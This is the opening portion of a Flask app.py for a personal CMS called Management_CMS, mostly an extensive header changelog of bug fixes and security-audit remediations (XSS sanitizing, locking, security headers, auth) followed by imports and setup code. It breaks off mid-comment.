"""
# ============================================================
# File:         app.py
# Description:  Management_CMS — administrative app for Links (categorized),
#               Notes (categorized), Todos (expandable detail), the
#               management_cms public-hosting layer (Pages, Posts,
#               Categories, Nav, Media), and static-site Build.
#               Persistence: per-section MFDBs (Content/Notes, Content/Tasks,
#               Content/Links, Content/Page, Content/Post, Content/Category,
#               Content/Nav, Content/media) via lib/Management and
#               lib/Management_CMS, deployed on a Web_Framework scaffold.
#               Config and static-page rendering factored into their own
#               Management library files. Formerly branded "Homepage
#               Builder" — renamed; see data/changelog.md for the rebrand.
# Version:      5.9.0
# Date:         2026-08-13
# Author:       Elton Boehnen
# Contact:      eltonboehnen@gmail.com
# Site:         boehnenelton2024.pages.dev
# GitHub:       github.com/boehnenelton
# RELATIONAL_ID: 026d15c6-9008-4dd2-b760-d2cb4a02e5ee
#
# CHANGELOG (5.9.0, 2026-08-21): Audit remediation pass (fifth external
# audit round). SEC-01 (stored XSS): content_html now runs through a new
# stdlib-only _sanitize_content_html() after the existing lint, at all 4
# create/update routes — nh3 (the audit's suggestion) evaluated and
# rejected, no prebuilt wheels for Termux/Bionic libc, same class of risk
# already avoided for hash-pinning; unit-tested 18 cases, verified live
# through the real save pipeline (script+onerror payload sent, stripped;
# safe content preserved). DAT-01 (no write locking): found the fix
# already half-existed — bejson_core_atomic_write() was already atomic,
# but bejson_core_acquire_lock()/release_lock() were dead code, never
# called anywhere — wired them around every entity mutation function's
# read-modify-write cycle in lib_bejson_Core_mfdb_core.py; proved it with
# a real 15-thread concurrent-write test (0 lost updates, was previously
# unprotected). SEC-03 (SVG XSS + no security headers): CSP + forced
# download on .svg responses, X-Content-Type-Options/X-Frame-Options/
# Referrer-Policy on every response; also fixed a real path-traversal bug
# in serve_media_file() found while touching this route (bejson_safe_join
# was never called there at all). SEC-04: in-memory rate limiting +
# logging on failed admin-token attempts, verified live (10 allowed, 11th
# 429s, even the correct token locked out during cooldown). SEC-05:
# admin_token.txt now chmod 0600. SEC-08: refuses to start rather than
# just warn when NO_AUTH=1 meets a non-loopback bind. DAT-02: category
# delete's FK-cleanup cascade now logs loudly on partial failure instead
# of silently leaving orphaned category_id_fk values. DAT-03: added a
# real admin_media_id FK between the CmsMedia and admin Media records
# (previously joined only by coincidentally matching original_path
# strings) — schema change appended per this project's field-order
# convention, existing rows backfilled with "", delete path falls back
# to the old string-match for any record predating this field. BLD-01:
# a loopback site_url now degrades to relative output the same as an
# empty one, instead of baking a confidently-wrong
# http://127.0.0.1:5030/... URL into every canonical/OG/sitemap entry;
# caught and fixed a real regression in my own first pass at this (a
# blanket find-replace nearly broke the M-6 warning's own loopback
# detection) before it shipped. SEC-02 (structural onclick migration),
# QUA-01/02/03 (test suite, frontend decomposition, touch drag-and-drop),
# and DAT-04 (vestigial schema cleanup) deliberately not started this
# pass — each needs its own dedicated scope, consistent with how
# CHECKLIST 1b has been treated all along.
#
# CHANGELOG (5.8.0, 2026-08-19): Four feature requests (global footer,
# related posts, auto-TOC, custom 404) plus a serious data-integrity bug
# found and fixed while testing them.
#
# CRITICAL FIX FOUND DURING THIS WORK: management_cms_content_update_post()/
# update_page() popped content_html out of the entity update, writing it
# ONLY to the separate content file, never back to the entity record's
# own content_html field — meaning management_cms_static_build() (which
# reads posts/pages via list_posts()/list_pages(), straight from the
# entity, never the content file) silently kept publishing the ORIGINAL
# creation-time content forever, no matter how many times a post/page was
# actually edited and rebuilt afterward. The admin editor itself never
# showed this — get_post()/get_page() (used to populate the edit form)
# DO read the content file, so an edit always looked like it worked when
# checked the obvious way. Found by testing the TOC feature (a real edit
# didn't show up in a real build) rather than assumed; grepped every
# update_* function in lib/Management/*.py for the same pattern (only
# these two hit); fixed by leaving content_html in the updates dict so
# the entity gets it too, matching what create_post()/create_page()
# already did; verified live against the real content-list function the
# builder uses. See docs/data-integrity-notes.md for full detail. No
# existing project content was found desynced — checked all real posts/
# pages before and after, nothing needed repair.
#
# Features, all verified live via real builds + Playwright, not just
# code review: global footer (new footer_text config setting, "© <year>
# <site_title>[ · footer_text]" computed once per build, threaded
# through all 5 page-type builders), related posts (2-3 same-category
# posts at the bottom of a post page, reusing the existing feed-card
# renderer — empty-safe, confirmed absent when there's nothing to
# relate), auto-TOC (h2/h3 in content_html get id= attributes injected
# and a linked contents box above the article — regex-based on purpose,
# not a full parser, since content_html is already tag-balance-verified
# at save time; skips headings under a 2-heading threshold so a short
# post doesn't get a pointless 1-item TOC; respects a heading's existing
# id= if hand-authored), custom 404 (Export/404.html, the filename every
# major static host auto-detects by convention — derived from the live,
# fully-current "page" skeleton rather than reconstructed from scratch,
# so it inherits every sidebar/CSS fix already tested this session;
# registered as a proper 6th ComponentMap+SkeletonStore component rather
# than raw-patched, avoiding the fragility that caused this session's
# earlier skeleton-reversion incidents; wired into serve_preview() too,
# via a shared _rewrite_preview_html() helper factored out after almost
# shipping a copy-paste that would've missed the same broken-link fix
# from 5.6.0). Caught and fixed one CSS specificity bug of my own before
# shipping: the 404 page's "Back to Home" button was white-text-on-red
# by design but a more specific existing rule (.becss-c-main a) was
# silently overriding it to red-on-red — invisible — caught via a
# Playwright screenshot showing an empty-looking button, not assumed
# fine because the code read correctly.
#
# CHANGELOG (5.7.0, 2026-08-17): Feature request — Elton asked for a
# YouTube link category in the media picker that "work[s] the same way
# as images but embed[s] differently." The picker already had a YouTube
# tab and stored a normalized youtube.com/watch?v=<id> URL in the same
# featured_image field images use ("the same way" — no schema change,
# same field, same picker) — but the render side only ever knew how to
# do <img src="...">, which is broken for a webpage URL. Added YouTube
# detection/embedding to lib_bejson_Management_shared.py:
# management_cms_shared_youtube_id() (kept in exact parity with
# lib_bejson_Management_media.py's own _extract_youtube_id() — unit-
# tested both against 7 identical inputs before wiring in, all matched),
# management_cms_shared_youtube_embed_html() (responsive 16:9 iframe
# player, for the post page hero), and
# management_cms_shared_export_thumbnail() (resolves to the real
# YouTube thumbnail JPG for feed-card listings — an iframe doesn't
# belong in a small card, so listings get an image with a play-icon
# overlay instead, wired through a new is_video flag on
# management_cms_shared_render_feed_card()). Wired into all 4 places
# that already handled featured_image (post hero, home/category/tag
# feeds, Recent Posts widget) plus the one place that didn't yet (the
# post hero itself, previously image-only).
#
# Verified live end-to-end, not just unit-tested: set a real YouTube URL
# on the test post, ran an actual build, confirmed the post page got a
# real <iframe src="https://www.youtube.com/embed/...">, the homepage/
# category/widget feed cards got the real img.youtube.com thumbnail JPG
# plus the play-badge, then confirmed via Playwright that the iframe
# element and its 16:9 container render at the correct size/position
# (the video itself doesn't play in this sandbox — youtube.com isn't in
# its network allowlist, same category as the earlier Google Fonts
# block, not a bug). Restored the test post's original image afterward
# and rebuilt clean before packaging.
#
# CHANGELOG (5.6.1, 2026-08-17): Root-caused the "canonical skeleton
# store silently reverts" problem that had already recurred twice this
# session and needed re-patching each time. Found it by reading code
# instead of re-patching a third time:
# _ensure_cms_components_registered()'s own docstring calls it a
# "one-time seed," but it actually called
# webframework_components_register() unconditionally in its loop, every
# single time it ran — and it runs on EVERY app startup via
# ensure_scaffold_deployed(), which has no guard around calling it.
# webframework_components_register() itself unconditionally overwrites
# an existing skeleton's content (see _upsert_skeleton() in
# lib_bejson_Management_components.py), so every restart silently
# clobbered the canonical SkeletonStore back to hardcoded factory
# defaults — including the redesign, M-1, and nav-group work, since none
# of that was protected by a user_customized flag on the canonical copy
# (only this app's own root manifest copy has that protection).
#
# Fixed with the one-line guard the docstring already claimed existed:
# skip registration if webframework_components_get_record(component_id)
# already returns a record. Verified this actually holds, not just that
# it looks right: restarted the live app three separate times and
# confirmed the canonical store's redesign content survived intact after
# every one, instead of asserting the fix and moving on.
#
# CHANGELOG (5.6.0, 2026-08-17): Elton reported broken images/links in
# the exported site's sidebar, and the sidebar's category labels reading
# identically to post/page titles with no way to collapse sections.
# Three real, verified bugs found and fixed:
#
# 1) Broken images. Post's featured_image stores an admin-app-only
#    /media-files/<name> path (that route only exists on the running
#    Flask app — see @app.route("/media-files/...") — and only serves
#    Content/media/uploads/, not the exported Export/media/ copy). The
#    M-1 feature (5.4.0) embedded that raw path straight into exported
#    HTML — works by coincidence through this app's own preview (since
#    /media-files/ happens to be a real top-level route here), but 404s
#    on any genuine static hosting the export is deployed to, which is
#    the entire point of a static export. Added
#    management_cms_shared_export_media_url() to lib_bejson_Management_shared.py,
#    rewriting /media-files/<name> -> /media/<name> (what Export/ actually
#    contains) at all 4 call sites that read featured_image. Verified
#    live via Playwright: naturalWidth/naturalHeight went from 0x0 to the
#    real image's actual 1376x768.
#
# 2) Broken links (pre-existing, not introduced by fix #1 — reproduced
#    and confirmed independently). serve_preview()'s <base href="/preview/">
#    only rewrites RELATIVE URLs per the HTML spec; every link this app's
#    static builder generates (post/page/category/tag/media — all of it)
#    is absolute by deliberate, consistent design, which a <base> tag
#    can't touch. Clicking a real sidebar nav link inside the preview
#    iframe navigated to a top-level route that doesn't exist — reproduced
#    via Playwright before fixing (landed on a genuine 404 page), fixed
#    generally (not just for the one media path that also broke) with a
#    regex rewrite of every href="/…"/src="/…" not already under
#    /preview/ or protocol-relative, run on every previewed HTML page.
#    Verified live: same nav-link click now lands on the real post page
#    with real content, inside the sandbox.
#
# 3) Category/Pages/Recent-Posts section labels in the sidebar
#    (.becss-c-nav-group__label) were emitted with that class from day
#    one of the redesign but the class was never actually styled — fell
#    back to identical body-text styling as the links underneath them.
#    Added real differentiation (uppercase, monospace, smaller, muted
#    color) plus a collapse/expand toggle (chevron, click-to-collapse,
#    CSS max-height transition) via a new _navGroupToggle() function.
#    Verified live: computed styles now differ from nav-link styles on
#    every checked property, and clicking a label correctly toggles
#    collapsed state back and forth.
#
# Applied to both ComponentsMFDB skeleton stores. Along the way, found
# and fixed a SECOND instance of the "canonical library copy silently
# reverted" problem from earlier this session (this time to a HYBRID
# state — old shell with new CSS bolted onto it, from a patch script
# running against an already-reverted file without re-checking first).
# Did a full clean re-restoration of both stores in the correct order
# this time (base redesign -> M-1 -> nav-group) and re-verified every
# marker is present in both files before proceeding, rather than trusting
# an incremental patch script's own idempotency guards blindly.
#
# CHANGELOG (5.5.0, 2026-08-15): Fourth-round audit against v5.4.1/PKG104.
# One HIGH finding (N-1: admin token allegedly shipped in the package) did
# NOT reproduce — checked directly (unzip -l | grep -i token against every
# zip actually delivered this project, all zero hits) rather than trusted;
# this is now the fourth phantom/false-negative finding across four audit
# rounds (after H-1/H-3/half-H-4 in round 3). Still closed the underlying
# hygiene gap defensively since it costs nothing: added a .gitignore
# (never existed before, despite a code comment claiming
# "gitignored-by-convention" since the H-1 round-2 fix) and a
# packaging-exclusion note in docs/security-notes.md.
#
# Real findings, fixed: N-2 (loopback site_url passed the M-6 empty-string
# check silently — verified live that a build triggered through the
# actual running app captures request.host_url verbatim, producing
# canonical="http://127.0.0.1:5030/" with zero warning; added a second
# warning specifically for loopback addresses, verified live that it now
# fires), N-3 (Persist/ backup snapshots accumulate by design with no
# operator-visible size signal — added a soft, non-deleting size advisory
# at startup, verified the size-calculation logic against the real
# Persist/ directory), N-5 (config/config.bejson's accent_color/bg_color
# had drifted from the design system's actual palette — aligned to
# #DE2626/#0a0a0a).
#
# N-4 (hash-pinned requirements.txt) was considered and deliberately NOT
# implemented: attempted it, then caught that Pillow ships
# platform-specific wheels and hashes generated from this x86_64 dev
# sandbox would not match the wheel needed on the actual Android/Termux
# (aarch64) deployment target — shipping those hashes would break
# `pip install --require-hashes` on-device, worse than no hashes at all.
# Documented the reasoning and the correct on-device generation command
# in requirements.txt instead of shipping a broken pin.
#
# N-6 (old esc() in backup snapshots) — correctly left untouched, backups
# are immutable by design. N-7 (maintainability observations) — no action
# needed, informational only. Phase 2 (structural XSS migration) and
# Phase 3 (deferred-by-design items) both explicitly gated on Elton's
# scope approval per the audit's own pacing rule — not started.
#
# CHANGELOG (5.4.1, 2026-08-15): CRITICAL HOTFIX. Elton reported "only
# header shows" and asked for Playwright tests. Real-browser testing
# (Playwright + actual Chromium, not the old wkhtmltoimage/Qt-WebKit
# renderer used earlier this session) traced it to a genuine JavaScript
# SyntaxError in templates/index.html: the LOW #3 fix in the round-3
# audit pass (correcting the login-gate's token-location message) wrote
# an apostrophe escape as \\' (backslash-backslash-quote) instead of \'
# (single backslash-quote) inside a single-quoted JS string. The double
# backslash renders as one literal backslash character, leaving the
# following ' unescaped — which prematurely terminates the string
# literal mid-sentence, producing "Unexpected identifier 's'" and
# aborting the ENTIRE inline <script> block's parse. With the whole
# script failing to parse, ZERO JavaScript on the page executes: no
# login gate, no panel loading, no Build/Preview — only the static HTML
# shell (header markup) renders, exactly matching "only header shows."
#
# This shipped in BOTH v5.3.0/PKG102 and v5.4.0/PKG103 — the fix that
# introduced it landed before either was packaged. Confirmed via
# node --check on the extracted script block (reproduced the exact
# SyntaxError), fixed the single character, re-verified with
# node --check (clean) AND a full real-browser Playwright pass: login
# gate renders and accepts the token, Build panel loads, Preview button
# opens the modal, the iframe shows real content (sidebar nav, feed
# card, footer) — confirmed via inner_text() and DOM queries, not just a
# screenshot. Grepped the whole file for the same \\' pattern elsewhere
# (none found) and syntax-checked every <script> block in the file (one
# block, clean). Also cleaned up a leftover "Cycle Test Child" test
# category from earlier M-7 testing that a stale Export/ build was still
# referencing — rebuilt Export/ fresh.
#
# CHANGELOG (5.4.0, 2026-08-14): M-1/M-5/M-7/M-8 from the round-3 audit,
# plus a self-caught regression fix. M-1: featured_image was settable in
# the admin editor but nothing on the export side ever read it — wired
# through management_cms_shared_render_feed_card()/render_feed() (new
# optional thumbnail param) into all 4 places that build feed items
# (category archive, tag archive, homepage feed, Recent Posts widget),
# plus a hero image on individual post pages. M-5: "debug" config setting
# had zero consumers anywhere — removed (see docs/dead_code.md);
# show_clock/show_greeting/accent_color/bg_color are NOT dead but only
# affect the Termux CLI's separate export path, not this app's own Build
# button — flagged inline in the Settings panel instead of leaving that
# silently confusing. M-7: category drag-drop had no cycle protection
# beyond direct self-parenting — added real ancestor-chain checking both
# server-side (update_category()) and client-side (drag pre-check);
# verified live against a running instance with a real attempted cycle
# (400, correctly rejected). M-8: the scheduled_at datetime-local input
# sent a bare local-time string straight to the server, string-compared
# against UTC — verified via Node that a US-Eastern user scheduling
# "2pm local" would have auto-published ~2.5 hours early under the old
# code; added proper local<->UTC conversion at the UI boundary in both
# directions, verified round-trip exact.
#
# Also: caught and fixed a regression from earlier in this session — a
# live test run of the round-3 scaffold resync fix (verifying it
# actually worked) silently reverted the exported-site redesign in both
# ComponentsMFDB skeleton stores, since those rows were never flagged
# user_customized. Restored the redesign, re-applied M-1's CSS/tokens on
# top of it, and marked the 5 redesigned components user_customized in
# the project's own store so a future resync can't silently clobber this
# again. The v5.3.0/PKG102 zip already delivered predates this accident
# and does not carry it — caught before anything shipped with it.
#
# CHANGELOG (5.3.0, 2026-08-14): Round-3 audit remediation, plus the
# exported-site redesign built earlier this session (BEJSON-vanilla
# design system, applied to all 5 ComponentsMFDB layout skeletons — see
# data/changelog.md for that entry in full, no app.py changes there).
# Round 3 covered: H-2 (stale "lib/Management_Live/" comment corrected —
# the by-name MFDB migration actually landed in place in
# lib/Management/*.py, traced and confirmed live; also resolved the
# audit's own open question about lib_bejson_Management_cli.py inheriting
# the fix), H-4 (absolute Termux device paths in taxonomytype.bejson and
# both media.bejson files — fixed at the write sites in
# lib_bejson_Management_bootstrap.py/init.py to store project-relative
# paths, the read sites in lib_bejson_Management_scaffold.py/cli.py and
# this file's delete-media route to resolve either format, and the
# current data itself), H-5 (unescaped selectUrl in the media picker's
# onclick — one call site skipped esc() while its neighbors didn't), M-2
# (category-archive empty-state message now says "pages" vs "posts"
# correctly instead of always "posts"), M-3 (post byline showed the
# category SLUG instead of its title — lib_bejson_Management_static_builder.py
# was wired to the slug-map lookup where a title map belonged; added
# management_cms_taxonomy_get_category_title_map() and switched to it),
# M-4 (admin_token cookie now HttpOnly — confirmed no JS reads it first —
# and Secure when the connection actually is; hardcoding Secure=True
# would've silently broken the default HTTP-loopback bind), M-6 (the
# download button only ever served Export/index.html, not the full
# multi-page build — now zips the entire Export/ tree; verified live: a
# real download came back as a 692KB/13-file zip, not a single HTML file).
# LOW items: removed a duplicate _TOKEN_FILE definition, corrected
# misleading login-gate/comment text about where the token is actually
# printed vs. found, fixed openPreview()'s 401-vs-404 message conflation,
# and fixed the hb_style.css filename mismatch — which turned out to have
# its actual root cause in TWO scaffold-generation functions in
# lib_bejson_Management_scaffold.py (webframework_scaffold_deploy_taxonomy_mfdb()
# and webframework_scaffold_resync_components()), not just the 11 stale
# template.html files; fixed there too and confirmed live by re-running
# the resync function and watching it regenerate correct links without
# reintroducing the bug or clobbering the earlier H-3/L-6 skeleton fixes.
# Three of the audit's findings (H-1 "lib/ entirely missing", H-3 "Export
# missing feed.xml/atom.xml/sitemap.xml", and half of H-4 "no media
# binaries shipped") did not reproduce against the actual delivered
# files — verified directly via unzip -l against the real zip, not
# assumed. This is the third audit round in a row with this exact
# pattern; flagged prominently for Elton rather than re-"fixing" the same
# phantom findings a third time.
#
# CHANGELOG (5.2.0, 2026-08-13): Round-2 audit — a review of the 5.1.0
# remediation pass itself found it shipped one critical self-defeating
# flaw plus three inaccurate claims. Fixed: H-1 round 2 (the 5.1.0 auth
# gate exempted "/" from the token check, then rendered ADMIN_TOKEN
# straight into that same unauthenticated page — a full bypass. "/" now
# ships with no token; a client-side login prompt collects it from the
# console/config/admin_token.txt, verifies via new route
# GET /api/auth/check, and holds it only in sessionStorage. GET-only
# navigations that can't set a header — the preview iframe, the download
# link — now authenticate via a SameSite=Strict cookie set by that same
# route instead of the old leaky ?token= query string, which is removed
# entirely; state-changing routes still require the header, so CSRF
# stays closed), L-4 round 2 (the <H2O> seed bug was fixed as data in
# 5.1.0 but nothing validated new saves, so it recurred — added
# _lint_content_html(), a balanced-tag check wired into all four
# create/update Page/Post routes), M-2 full scope (note_color is now
# validated server-side at the /api/notes POST/PUT routes too, not just
# at render). Also corrected three documentation inaccuracies from the
# 5.1.0 changelog entry (L-3/L-10 were done but never listed as fixed;
# security-notes.md claimed L-4 was durably fixed when it wasn't yet) and
# reassigned the one piece of leftover bad data from the pre-fix H-2 bug
# (Test Blog Post's orphaned category_id_fk). See data/changelog.md and
# CHECKLIST.md section 15 for the full pass-2 remediation list, including
# the templates/index.html, Content/*_style.css, and CHECKLIST.md fixes
# that don't touch this file.
#
# CHANGELOG (5.1.0, 2026-08-13): Audit remediation pass against
# MANAGEMENT_CMS5_AUDIT.txt (scoped to Package 13 / Project v4.18.0 /
# app.py v4.17.0 — this delivered zip was already at VERSION="5.0.0" in
# code with the header comment left stale at 4.17.0; that drift is fixed
# here too). Fixed: H-2 (category_id_fk mismatch silently dropped
# category on Page/Post create — now reads category_id_fk, falling back
# to legacy category_id), H-1/M-7 (no auth/CSRF on any route, bound to
# 0.0.0.0 — added a shared X-Admin-Token bearer-token before_request gate,
# persisted to config/admin_token.txt, wired through index.html's api()/
# withToken() helpers; host now defaults to 127.0.0.1, overridable via
# MANAGEMENT_CMS_HOST — NOTE: this specific fix had a critical bypass flaw,
# corrected in 5.2.0 above), H-4 (upload validation was fully trust-based —
# added extension allow-list + magic-byte content sniffing, independent of
# the client-supplied mimetype; MAX_CONTENT_LENGTH caps body size), M-5
# (build state read/written outside the lock — every _BUILD_STATE mutation
# now goes through _build_log()/_build_set(), both lock-guarded; status
# route reads one locked snapshot), L-1 (threading/traceback imports moved
# to the top), L-2 (print() replaced with the logging module). See
# data/changelog.md for the full remediation list, including the
# templates/index.html, static_builder library, and scaffold/skeleton
# fixes (M-1, M-2, M-3, M-4, M-6, M-8, H-3, L-6, L-7, L-8) that don't
# touch this file.
#
# CHANGELOG (4.17.0, 2026-07-28): Added CSS for two new features built in
# lib_bejson_Management_static_builder.py: the homepage hero block
# (.becss-c-hero*, site title + tagline styled distinctly above the feed)
# and feed pagination (.becss-c-pagination*, prev/next + numbered page
# links). No app.py logic changed — this file is purely the CSS half.
#
# CHANGELOG (4.16.0, 2026-07-27): Added a favicon (self-contained inline
# SVG data URI, no asset to ship) and Open Graph meta tags
# (og:type/og:title/og:description/og:url/og:site_name + a canonical link
# + twitter:card) to page_shell(), via new {{og_title}}/{{og_description}}/
# {{canonical_url}} tokens populated per-page in
# lib_bejson_Management_static_builder.py. page_shell() also now takes
# an og_type param ("website" for pages/home, "article" for posts).
# Verified end-to-end with a real build: favicon present, OG tags
# populated correctly (not leftover {{tokens}}) on home/post/category
# pages, correct canonical URLs on each.
#
# CHANGELOG (4.14.0, 2026-07-26): Full codebase audit pass. Real bug found
# and fixed: delete_media() only ever removed the MFDB row —
# management_media_delete() never touched the physical file (or its WebP
# sibling) on disk, a permanent storage leak on every "delete", and never
# touched the separately-created CmsMedia record for the same upload (the
# two Media bookkeeping systems share no foreign key, only the same
# original_path by coincidence). Now looks up the record before deleting
# it, removes both files if present (missing files aren't an error), then
# finds and deletes the matching CmsMedia record by original_path. Full
# upload-simulate-then-delete cycle tested: file, webp, admin record, and
# linked CMS record all confirmed gone; unknown-id delete still 404s
# cleanly.
#
# CHANGELOG (4.13.0, 2026-07-25): Notes/Tasks/Links/Nav/Media imports
# repointed from lib/Management/* to new lib/Management_Live/* copies —
# same public function names, drop-in replacement. The new copies have
# their positional mfdb_core_add_entity_record() calls migrated to
# mfdb_core_add_entity_record_by_name() (checklist item 2b, closed for
# every entity the live Flask app actually touches). The originals in
# lib/Management/ are untouched, since lib_bejson_Management_cli.py still
# depends on them directly — copy-then-fix instead of modify-in-place, per
# Elton's explicit instruction, to respect Library Immutability for a file
# another tool depends on. Verified app.py actually loads the new copies at
# runtime (checked NotesLib.__file__), then functionally exercised all 9
# migrated call sites (Note, NoteCategory, TodoItem, TaskCategory, Link,
# LinkCategory, NavLink, Media upload path, Media external/YouTube path)
# through the real app-created manifests, not in isolation.
# landing.py and pages.py (lib/Management/) were NOT copied — app.py never
# imports either; they're CLI/bootstrap-only, genuinely out of scope here.
#
# CHANGELOG (4.11.0, 2026-07-25): Nav sidebar restyle, requested directly
# ("sidebar looks kind of goofy, use the sidebar design from the two
# templates"). Previously nav links were plain inline text with no padding,
# and a group label sat crammed inline next to its wrapped link list.
# Reworked into tree-row-style rows (padding, border-radius, hover
# background + red left-accent border on hover in the mobile flyout),
# matching the reference docs' .becss-tree__row visual language — without
# copying their JS expand/collapse behavior or admin-style icons, just the
# row/hover treatment applied to the existing nav structure. Verified with
# a real build that the new classes render correctly in generated HTML.
#
# CHANGELOG (4.10.0, 2026-07-25): Shared feed-component pass, built from
# Elton's provided BECSS reference skeletons (card-based feed, cascade
# palette). Added .becss-c-feed*/card CSS to shared_style. The category
# archive, tag archive, and homepage recent-posts feed now all render the
# same card component (management_cms_shared_render_feed() in
# lib_bejson_Management_shared.py) instead of three separate bare
# <li><a> lists. Fixed the category/tag archive default templates'
# "<ul>{{post_list_html}}</ul>" wrapper — post_list_html is now a
# self-contained <div class="becss-c-feed">, so wrapping it in <ul> would
# have put a <div> directly inside a <ul> (invalid HTML). Kept the
# existing black/white/#DE2626 hex token palette rather than adopting the
# reference doc's OKLCH functions — same palette Elton's dev policy already
# specifies, no reason to switch color systems for this. Did not adopt the
# reference docs' collapsible admin tree-nav sidebar for the public site —
# that's appropriate for the *internal* dashboard, not for public visitors
# browsing a blog; kept the existing flat nav + hamburger instead. Real
# multi-page pagination (splitting a feed into feed/page/2.html etc.) was
# NOT implemented — deferred, see CHECKLIST.md.
#
# CHANGELOG (4.9.0, 2026-07-22): Exported-site refinement pass, requested
# directly after live-export review. (1) Category URL symmetry: post
# categories used to output as /category/ while page categories were
# /page-category/ — asymmetric, with the "post-" qualifier silently
# dropped, easy to mistake for the only category concept. Renamed to
# /post-category/ for exact symmetry. BREAKING for any already-published
# site using the old /category/ URLs. (2) Added lang="en" and a viewport
# meta tag to the default page_shell() (both were missing entirely).
# (3) Nav is now a real collapsible hamburger menu below 640px instead of
# a plain inline list with nowhere to go on narrow screens. (4) Post
# byline/tags: fixed the same dangling-"· "/orphaned-"Tags:" bug found
# during the export review — see
# lib_bejson_Management_static_builder.py's changelog. Verified with a
# full end-to-end build (not just unit tests): confirmed real
# /post-category/ output, lang/viewport tags, and hamburger CSS all landed
# correctly in the generated HTML.
#
# CHANGELOG (4.8.0, 2026-07-21): Removed the unused `import
# lib_bejson_Management_build as Build` (dead code sweep) — corrected a
# stale comment that incorrectly implied the whole build library was
# orphaned; it's still actively used by lib_bejson_Management_cli.py, only
# this file's own import of it was dead. No route logic changed.
#
# CHANGELOG (4.6.0, 2026-07-21): Added DELETE /api/tags/<id> route (audit
# item 5), calling the now-orphan-safe management_cms_taxonomy_delete_tag().
# VERSION DRIFT NOTE: this file's prior header/VERSION said 4.3.1, but the
# audit text this session was written against referenced "v4.5.0" as
# current — flagged to Elton (confirmed by Elton as the correct prior
# version), rather than guessed at.
# CHANGELOG (4.7.0, 2026-07-21): Added _archive_legacy_file() (audit item
# 4c) — _migrate_legacy_config()/_migrate_legacy_data() now move (never
# delete) their source Persist/*.bejson file into
# Persist/_migrated_archive/<UTC timestamp>/ once migration succeeds.
# Confirmed both legacy files in this project snapshot were already
# consumed (current-format manifests already existed) and archived them.
# ============================================================
"""

from flask import Flask, render_template, request, jsonify, send_file, Response
from werkzeug.utils import secure_filename
from pathlib import Path
import json, os, sys, shutil, threading, traceback, logging, secrets, hmac, io, zipfile, re
import time as _time
from typing import Dict

# AUDIT FIX (L-3): Python version floor was undocumented. Path.unlink's
# missing_ok= kwarg (used below, in the legacy-file archive step) requires
# 3.8+; enforced here instead of failing later with a confusing TypeError.
if sys.version_info < (3, 8):
    sys.exit("Management_CMS requires Python 3.8 or newer "
              f"(found {sys.version_info.major}.{sys.version_info.minor}).")

# AUDIT FIX (L-1): threading/traceback used to be imported mid-file, in the
# BUILD section, instead of at the top with every other import — worked,
# but hid a real dependency and violated import conventions. Moved here.

VERSION = "5.9.0"

def get_script_path() -> Path:
    return Path(__file__).resolve().parent

SCRIPT_PATH = get_script_path()
LEGACY_DATA_FILE = SCRIPT_PATH / "Persist" / "homepage_data.bejson"    # old 104db — read once for migration, then untouched
LEGACY_CONFIG_FILE = SCRIPT_PATH / "Persist" / "config.bejson"          # old flat config location — read once for migration, then untouched

# ── lib/ bootstrapping (5.7.2 — check local dependencies before core logic) ──
for _sub in ("Core", "Management"):
    _p = str(SCRIPT_PATH / "lib" / _sub)
    if _p not in sys.path:
        sys.path.insert(0, _p)

import lib_bejson_Core_mfdb_core as MFDBCore
from lib_bejson_Core_bejson_path_guard import bejson_safe_join
import lib_bejson_Management_scaffold as WebFrameworkScaffold
import lib_bejson_Management_bootstrap as Bootstrap
import lib_bejson_Management_config as Config
# AUDIT FIX (H-2): this used to say Notes/Tasks/Links/Nav/Media come from
# a separate lib/Management_Live/ directory ("copy-then-fix instead of
# modify-in-place, to respect Library Immutability for
# lib_bejson_Management_cli.py, which still depends on the originals").
# That's not what's on disk: no lib/Management_Live/ directory exists,
# sys.path only ever adds lib/Core and lib/Management, and the imports
# below are the plain lib_bejson_Management_* names. Checked what actually
# happened: the by-name migration (positional
# mfdb_core_add_entity_record() calls -> mfdb_core_add_entity_record_by_name())
# landed IN PLACE in lib/Management/lib_bejson_Management_notes.py and its
# siblings — confirmed via those files' own header changelogs and by
# grepping for mfdb_core_add_entity_record_by_name() calls, which are
# present and are what actually executes. The fix itself is real and
# live; only the "copied to a separate directory, originals left
# untouched for the CLI" claim was never true — the CLI, if it imports
# these same files directly, gets the migrated version too. Checked
# rather than left open: lib_bejson_Management_cli.py imports these same
# in-place-modified files, but only their public functions
# (management_notes_add(), etc.) — never the internal
# mfdb_core_add_entity_record*() calls directly — so the CLI picks up the
# same by-name fix automatically, with no signature change on its end to
# account for.
import lib_bejson_Management_notes as NotesLib
import lib_bejson_Management_tasks as TasksLib
import lib_bejson_Management_links as LinksLib
import lib_bejson_Management_nav as NavLib
import lib_bejson_Management_media as MediaLib
import lib_bejson_Management_init as CmsInit
import lib_bejson_Management_content as CmsContent
import lib_bejson_Management_taxonomy as CmsTaxonomy
import lib_bejson_Management_media_cms as CmsMedia
import lib_bejson_Management_static_builder as StaticBuilder

# AUDIT FIX (L-2): print()-based logging replaced with the stdlib logging
# module. Still on-device-friendly (stderr by default), but now has levels,
# a consistent format, and a named logger other modules could plug into —
# previously debugging remotely meant grepping raw print() output with no
# level/timestamp/source information at all.
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("Management_CMS")

app = Flask(__name__)

# AUDIT FIX (H-4): no cap on request body size meant a single upload could
# exhaust disk/memory with no server-side limit at all — the client-side
# form was the only thing stopping a huge file. 64 MB is generous for
# images/short video/audio/documents; bump via config.bejson if needed.
app.config["MAX_CONTENT_LENGTH"] = 64 * 1024 * 1024

# AUDIT FIX (SEC-03, partial): baseline security response headers on
# every response. X-Content-Type-Options stops a browser from ever
# re-sniffing a response's Content-Type against what the server declared
# — relevant here specifically because /media-files/ serves user-uploaded
# files where the declared type matters (see that route's own SVG
# handling). X-Frame-Options is SAMEORIGIN, not DENY: this app's own
# Preview feature legitimately iframes /preview/... from this same
# origin, so DENY would break a real feature; SAMEORIGIN still blocks
# a third-party site from framing this admin panel (clickjacking).
# Referrer-Policy limits what leaks in the Referer header on outbound
# navigation (e.g. clicking an external link pasted into content).
@app.after_request
def _add_security_headers(response):
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
    response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    return response

# AUDIT FIX (H-1/M-7): the app previously had ZERO authentication or CSRF
# protection on any route — every admin action (including
